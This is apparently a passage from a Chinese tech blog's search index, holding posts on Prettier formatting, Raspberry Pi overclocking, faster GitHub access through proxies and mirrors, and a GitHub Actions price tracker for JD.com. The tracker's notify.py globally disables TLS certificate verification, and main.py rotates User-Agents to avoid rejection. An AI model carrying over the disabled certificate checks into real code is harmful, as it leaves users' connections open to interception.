src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 